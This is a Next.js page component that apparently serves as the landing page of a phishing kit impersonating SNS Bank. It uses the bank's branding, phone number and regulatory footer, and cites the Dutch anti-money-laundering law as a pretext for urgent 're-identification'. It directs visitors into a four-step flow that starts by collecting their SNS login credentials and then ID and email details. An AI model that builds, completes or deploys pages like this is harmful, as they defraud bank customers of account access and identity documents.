"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Shield, Clock, FileCheck, Lock, Phone, CreditCard, User, CheckCircle } from "lucide-react"

export default function Page() {
  const router = useRouter()
  const [isStarting, setIsStarting] = useState(false)

  const handleStart = () => {
    setIsStarting(true)
    router.push("/step-1")
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-orange-50 to-white">
      {/* SNS Header */}
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <div className="w-16 h-16 bg-gradient-to-br from-orange-500 to-orange-600 rounded-xl flex items-center justify-center shadow-lg">
                <span className="text-white font-bold text-2xl">SNS</span>
              </div>
              <div>
                <h1 className="text-2xl font-bold text-gray-900">SNS Bank</h1>
                <p className="text-orange-600 font-medium">Veilig bankieren</p>
              </div>
            </div>
            <div className="flex items-center space-x-4">
              <div className="text-sm text-gray-600 bg-gray-100 px-3 py-2 rounded-lg">🇳🇱 Nederlands</div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-12">
        <div className="text-center mb-12">
          <div className="w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <Shield className="h-10 w-10 text-orange-600" />
          </div>
          <h1 className="text-4xl font-bold text-gray-900 mb-4 text-balance">Re-identificatie vereist</h1>
          <p className="text-xl text-gray-600 mb-8 text-balance max-w-3xl mx-auto">
            Om te voldoen aan de Wet ter voorkoming van witwassen en financieren van terrorisme (Wwft), moeten wij uw
            identiteit opnieuw verifiëren.
          </p>
        </div>

        {/* Progress Overview */}
        <div className="bg-white rounded-2xl shadow-lg border border-gray-100 p-8 mb-8">
          <h2 className="text-2xl font-semibold text-gray-900 mb-6 text-center">Het proces in 4 eenvoudige stappen</h2>
          <div className="grid md:grid-cols-4 gap-6">
            {[
              { icon: User, title: "Inloggen", desc: "Uw SNS gegevens" },
              { icon: FileCheck, title: "Persoonlijke gegevens", desc: "ID verificatie" },
              { icon: CreditCard, title: "Aanvullende info", desc: "Email en gegevens" },
              { icon: CheckCircle, title: "Bevestiging", desc: "Toestemming verlenen" },
            ].map((step, index) => (
              <div key={index} className="text-center">
                <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <step.icon className="h-8 w-8 text-orange-600" />
                </div>
                <div className="w-8 h-8 bg-orange-500 text-white rounded-full flex items-center justify-center text-sm font-bold mx-auto mb-3">
                  {index + 1}
                </div>
                <h3 className="font-semibold text-gray-900 mb-2">{step.title}</h3>
                <p className="text-sm text-gray-600">{step.desc}</p>
              </div>
            ))}
          </div>
        </div>

        {/* Information Cards */}
        <div className="grid md:grid-cols-2 gap-6 mb-8">
          <Card className="border-blue-200 bg-blue-50">
            <CardContent className="p-6">
              <div className="flex items-start space-x-4">
                <div className="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center flex-shrink-0">
                  <Lock className="h-6 w-6 text-blue-600" />
                </div>
                <div>
                  <h3 className="font-semibold text-blue-900 mb-2">Veilig en vertrouwd</h3>
                  <p className="text-blue-800 text-sm">
                    Dit proces is volledig beveiligd en voldoet aan alle Nederlandse bankwetgeving. Uw gegevens worden
                    veilig verwerkt.
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="border-green-200 bg-green-50">
            <CardContent className="p-6">
              <div className="flex items-start space-x-4">
                <div className="w-12 h-12 bg-green-100 rounded-lg flex items-center justify-center flex-shrink-0">
                  <Clock className="h-6 w-6 text-green-600" />
                </div>
                <div>
                  <h3 className="font-semibold text-green-900 mb-2">Snel en eenvoudig</h3>
                  <p className="text-green-800 text-sm">
                    Het hele proces duurt slechts 5-10 minuten en kan volledig online worden voltooid. Geen bezoek aan
                    een kantoor nodig.
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Requirements */}
        <Card className="border-orange-200 bg-orange-50 mb-8">
          <CardContent className="p-6">
            <div className="flex items-start space-x-4">
              <div className="w-12 h-12 bg-orange-100 rounded-lg flex items-center justify-center flex-shrink-0">
                <FileCheck className="h-6 w-6 text-orange-600" />
              </div>
              <div className="flex-1">
                <h3 className="font-semibold text-orange-900 mb-4">Wat heeft u nodig?</h3>
                <div className="grid md:grid-cols-2 gap-3">
                  <div className="flex items-center space-x-3">
                    <div className="w-2 h-2 bg-orange-500 rounded-full"></div>
                    <span className="text-orange-800 text-sm">Geldig Nederlands identiteitsbewijs</span>
                  </div>
                  <div className="flex items-center space-x-3">
                    <div className="w-2 h-2 bg-orange-500 rounded-full"></div>
                    <span className="text-orange-800 text-sm">SNS Bank inloggegevens</span>
                  </div>
                  <div className="flex items-center space-x-3">
                    <div className="w-2 h-2 bg-orange-500 rounded-full"></div>
                    <span className="text-orange-800 text-sm">Werkende camera of smartphone</span>
                  </div>
                  <div className="flex items-center space-x-3">
                    <div className="w-2 h-2 bg-orange-500 rounded-full"></div>
                    <span className="text-orange-800 text-sm">Ongeveer 5-10 minuten tijd</span>
                  </div>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Action Button */}
        <div className="text-center">
          <Button
            onClick={handleStart}
            disabled={isStarting}
            className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-semibold py-4 px-12 rounded-xl text-lg shadow-lg hover:shadow-xl transition-all duration-200 transform hover:scale-105"
          >
            {isStarting ? "Bezig met starten..." : "Start re-identificatie proces"}
          </Button>
          <p className="text-sm text-gray-500 mt-4 max-w-md mx-auto">
            Door verder te gaan gaat u akkoord met onze voorwaarden en privacybeleid voor re-identificatie volgens de
            Wwft wetgeving.
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-50 border-t border-gray-200 mt-16">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="text-center">
            <div className="flex items-center justify-center space-x-2 mb-4">
              <Phone className="h-4 w-4 text-gray-600" />
              <span className="text-sm text-gray-600">Hulp nodig? Bel 030 - 291 29 12</span>
            </div>
            <p className="text-sm text-gray-600 mb-2">© 2024 SNS Bank N.V. Alle rechten voorbehouden.</p>
            <p className="text-xs text-gray-500">
              SNS Bank is onderdeel van de Volksbank en staat onder toezicht van De Nederlandsche Bank en de Autoriteit
              Financiële Markten.
            </p>
          </div>
        </div>
      </footer>
    </div>
  )
}
